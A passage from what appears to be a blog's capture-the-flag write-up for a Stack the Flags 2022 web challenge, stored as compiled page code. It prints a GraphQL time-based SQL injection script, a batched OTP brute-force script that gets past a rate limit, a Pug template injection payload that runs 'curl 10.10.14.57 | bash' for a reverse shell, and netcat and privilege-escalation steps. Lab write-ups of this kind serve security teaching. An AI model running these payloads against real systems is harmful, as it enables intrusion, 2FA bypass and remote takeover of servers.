operator\",children:\"+\"}),\"res\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"char\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token string\",children:`\"%')-- \\\\\", password: \\\\\"a\\\\\"){\\\\n        message,\\\\n        token    \\\\n}\\\\n}\"`}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#print(burp0_json)\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        start \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" time\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"perf_counter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        session\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"post\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"burp0_url\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" headers\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"burp0_headers\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" json\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"burp0_json\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        request_time \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" time\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"perf_counter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),` start\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:'#print(\"[Char: ]\"+char+\" \"+str(request_time))'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" request_time \",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            res\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),`char\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"result: \"'}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"res\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"break\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"We run the script and we\\u2019re able to retrieve the username!\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp \\xBB python3 sql.py\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`result: J\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`result: Jo\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`result: Joh\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`result: John\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Just for the sake of the length of the writeup, we can use similar script to retrieve the MD5 of John user and crack it with \",(0,e.jsx)(n.a,{href:\"https://crackstation.net/\",children:\"Crackstation\"}),\" to get \",(0,e.jsx)(n.code,{children:\"iamcool\"}),\".\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Logging in with user \",(0,e.jsx)(n.code,{children:\"John:iamcool\"}),\" Works and we\\u2019re greeted with 2FA.\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/otp-web.png\",alt:\"A screenshot of OTP verification form. OTP will be sent through email, and will expire in 2 minutes\"})}),`\n`,(0,e.jsx)(n.p,{children:\"I tried to provide a random OTP to check the request and it\\u2019s a graphql query as well:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-graphql\",children:(0,e.jsxs)(n.code,{className:\"language-graphql code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"query\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"\\\\\",(0,e.jsx)(n.span,{className:\"token property\",children:\"n\"}),\"    \",(0,e.jsx)(n.span,{className:\"token object\",children:\"verify2FA\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"otp\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \\\\\",(0,e.jsx)(n.span,{className:\"token string\",children:'\"1234\\\\\"}{\\\\n     message,\\\\n   token \\\\n}\\\\n}\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"This GraphQL mutation queries a \",(0,e.jsx)(n.code,{children:\"verify2FA\"}),\" function with the provided one-time password (OTP). The function is expected to return a message and a token if the OTP is valid.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"The first thing I tried was to bruteforce but there is a ratelimit implemented which makes it quite impossible as the the OTP expires after 2 minutes.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/rate-limit.png\",alt:\"A screenshot which shows that we\\u2019re being rate-limited\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Since we\\u2019re not able to bruteforce it, I tried using GraphQL Batching, which improves performance by reducing the number of round trips between the client and the server. However, if not properly implemented, it can also create vulnerabilities that can be exploited. In our case, we will send a batch request containing a mix of legitimate and malicious queries. The server processes the legitimate queries and returns the results to us. In simpler words, we will be attempting to exploit a vulnerability in a GraphQL server that allows batching of multiple queries in a single request.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will create a function that generates a GraphQL mutation containing multiple \",(0,e.jsx)(n.code,{children:\"verify2FA\"}),\" queries with different one-time password (OTP) values and constructs a GraphQL mutation containing these queries and returns it. This is needed because we won\\u2019t be able to send all the OTP values at once.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"gen_payload\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    final\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" token \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"%04d\"'}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"%\"}),\" I \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" I \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"range\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\"i\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"500\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        single \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'\\\\n    jaja'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"token\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token string\",children:`' : verify2FA(otp: \\\\\"'`}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"token\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token string\",children:`'\\\\\"){\\\\n        message,\\\\n        token    }\\\\n '`}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        final\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),`single\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'mutation {\\\\n   '\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"final\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'  \\\\n}'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"return\"}),` payload\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Then we just keep bruteforcing until we get a hit and get the new token.\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` requests\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"while\"}),\" \",(0,e.jsx)(n.span,{className:\"token boolean\",children:\"True\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    session \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" requests\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"session\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    burp0_url \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194:80/graphql\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    burp0_cookies \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"session\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpvaG4iLCJvdHBfdmVyaWZpY2F0aW9uIjpmYWxzZSwiaWF0IjoxNjcwMDIwMDYyLCJleHAiOjE2NzAwMjM2NjJ9.r624Ftvgxhuo7rNPeI1JeJpQzVTXON6cNpN0EAmABiE\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    burp0_headers \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"User-Agent\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Content-Type\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"application/json\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"*/*\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Origin\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Referer\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194/admin/otp_verfification\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept-Encoding\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"gzip, deflate\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept-Language\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"en-US,en;q=0.9\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Connection\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"close\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    burp0_json\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"query\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" gen_payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    rar \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" session\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"post\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"burp0_url\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" headers\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"burp0_headers\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" cookies\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"burp0_cookies\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" json\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"burp0_json\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"text\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"token\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" rar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"text\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"hurray: \"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"break\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    i\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"500\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And we just run the script until we get a hit:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/token-got.png\",alt:\"A screenshot that shows that we got a valid token\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Now we can use the new token to access the dashboard:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/dashboard-admin.png\",alt:\"A screenshot of the admin dashboard\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"In the \",(0,e.jsx)(n.code,{children:\"/admin/setting\"}),\" endpoint. We have a way to render a template!\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/admin-ssti-template.png\",alt:\"A screenshot of the admin templates section\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So the first thing that comes in mind now is we find an SSTI. Knowing from the \",(0,e.jsx)(n.code,{children:\"Response Headers\"}),\" that we\\u2019re dealing with an Express nodejs server. I just tried a bunch of payloads \",(0,e.jsx)(n.code,{children:\"{{7*7}} ${7*7} #{7*7}\"}),\" And the \",(0,e.jsx)(n.code,{children:\"#{7*7}\"}),\" works.\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/pugssti-template.png\",alt:\"A screenshot that shows the execution of pug ssti\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"This means that we\\u2019re dealing with a \",(0,e.jsx)(n.code,{children:\"pug ssti\"}),\".  I\\u2019ll be using the following payload where I am hosting a bash reverse shell in my local webserver and piping into bash.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsx)(n.code,{className:\"language-js code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"#\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token keyword\",children:\"function\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"localLoad\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"global\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"process\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"mainModule\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"constructor\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"_load\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"sh\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"localLoad\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"child_process\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"exec\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'curl 10.10.14.57 | bash'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})})}),`\n`,(0,e.jsx)(n.p,{children:\"And I get a shell as john and grab the flag:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp \\xBB rlwrap \",(0,e.jsx)(n.span,{className:\"token function\",children:\"nc\"}),\" -lvnp \",(0,e.jsx)(n.span,{className:\"token number\",children:\"443\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"listening on \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"any\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"443\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"..\"}),`.\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"connect to \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"10.10\"}),\".14.57\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" from \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"UNKNOWN\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"10.129\"}),\".228.37\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"44176\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"can't access \",(0,e.jsx)(n.span,{className:\"token function\",children:\"tty\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),` job control turned off\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"id\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"cd\"}),` ~\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"cat\"}),` user.txt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STF22\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"g410f27d35f21325f47d83c375dedf32\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.h3,{id:\"privilege-escalation\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#privilege-escalation\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Privilege Escalation\"]}),`\n`,(0,e.jsx)(n.p,{children:\"First, I will stabilize my shell:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ python3 -c \",(0,e.jsx)(n.span,{className:\"token string\",children:`\"import pty;pty.spawn('/bin/bash')\"`}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@bautycare:~$\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\"  + \",(0,e.jsx)(n.span,{className:\"token number\",children:\"583791\"}),\" suspended  rlwrap \",(0,e.jsx)(n.span,{className:\"token function\",children:\"nc\"}),\" -lvnp \",(0,e.jsx)(n.span,{className:\"token number\",children:\"443\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp \\xBB stty raw -echo\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"fg\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\"  + \",(0,e.jsx)(n.span,{className:\"token number\",children:\"583791\"}),\" continued  rlwrap \",(0,e.jsx)(n.span,{className:\"token function\",children:\"nc\"}),\" -lvnp \",(0,e.jsx)(n.span,{className:\"token number\",children:\"443\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@beautycare:~$\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"john@beautycare:~$ \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"export\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:(0,e.jsx)(n.span,{className:\"token environment constant\",children:\"TERM\"})}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`xterm\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"export\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:(0,e.jsx)(n.span,{className:\"token environment constant\",children:\"TERM\"})}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`xterm\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@beautycare:~$\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Then, I\\u2019ll check if we have any sudo rights:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"john@beautycare:~$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"sudo\"}),` -l\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Matching Defaults entries \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),` john on beautycare:\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    env_reset, mail_badpass,\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"secure_path\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"/usr/local/sbin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\":/usr/local/bin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\":/usr/sbin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\":/usr/bin\",(0,e.jsx)(n.span,{className:\"token 